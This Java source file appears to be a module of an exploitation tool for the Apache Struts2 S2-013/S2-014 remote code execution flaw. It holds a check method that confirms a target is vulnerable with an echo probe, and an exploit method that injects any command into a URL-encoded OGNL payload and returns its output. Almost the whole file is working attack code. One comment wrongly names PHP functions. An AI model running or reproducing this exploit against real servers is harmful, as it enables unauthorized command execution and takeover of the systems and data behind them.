package Module;

import Framework.HTTPinterface;

/**
 * S2-013/S2-014 远程代码执行漏洞
 *
 * 影响版本: 2.0.0 - 2.3.14.1
 * 漏洞详情:
 * http://struts.apache.org/docs/s2-013.html
 * http://struts.apache.org/docs/s2-014.html
 */

public class S2_013_RCE {
    public static Boolean check(String url){
        try {
            String result = HTTPinterface.GET(url +
                    "?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime()." +
                    "exec('echo+112233').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C" +
                    "%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C" +
                    "%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C" +
                    "%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D");
            if(result.contains("112233")){
                return true;
            }else{
                return false;
            }
        }catch (Exception e) {
            return false;
        }
    }

    public static String exploit(String url,String cmd){
        try{
            cmd=cmd.replace(" ","+");    //替换空格为加号，防止在拼接payload时出错
            String payload=url+
                    "?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime()." +
                    "exec('"+cmd+"').getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C" +
                    "%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C" +
                    "%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C" +
                    "%23out.println('dbapp%3D'%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D";
            //如需修改命令执行函数，改写上面这行的shell_exec为需要的函数即可（如system/exec/passthru等）
            String result=HTTPinterface.GET(payload);
            return result;
        }catch (Exception e){
            return "[-]访问出错";
        }
    }
}
